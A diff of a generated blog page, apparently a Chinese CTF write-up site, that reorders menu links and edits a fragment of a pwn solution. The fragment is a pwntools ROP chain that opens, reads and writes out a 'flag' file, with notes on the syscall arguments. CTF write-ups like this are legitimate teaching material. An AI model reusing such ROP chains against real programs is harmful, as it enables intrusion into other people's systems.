@@ -219,9 +219,9 @@
           
           
           <li>
-            <a href="/about/">
+            <a href="/categories/">
               
-              关于
+              分类
               
               
             </a>
@@ -230,9 +230,9 @@
           
           
           <li>
-            <a href="/tags/">
+            <a href="/about/">
               
-              标签
+              关于
               
               
             </a>
@@ -252,9 +252,9 @@
           
           
           <li>
-            <a href="/categories/">
+            <a href="/tags/">
               
-              分类
+              标签
               
               
             </a>
@@ -372,7 +372,7 @@
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">546</span> In Total
+              Words <span class="post-count">549</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -428,11 +428,12 @@ payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi)
 
 payload += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(data_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>) + p64(write_addr)
 
-payload += <span class="hljs-string">b&#x27;flag&#x27;</span>**.**ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) 
+payload += <span class="hljs-string">b&#x27;flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) 
 
 r.sendline(payload)</code></pre>
 <p>注：</p>
-<p>1.open函数指向的文件是一个指针，得先把flag存起来，再指向</p>
+<p>1.open函数指向的文件是一个指针，得先把flag存起来，再指向
+-&gt;<code>rop_addr + 0x98</code></p>
 <p>2.read函数第一个参数3，指向open打开的文件
 ，第二个参数指向写入的地方</p>
 <p>3.write函数第一个参数1，代表写入到输出，第二参数指原数据</p>
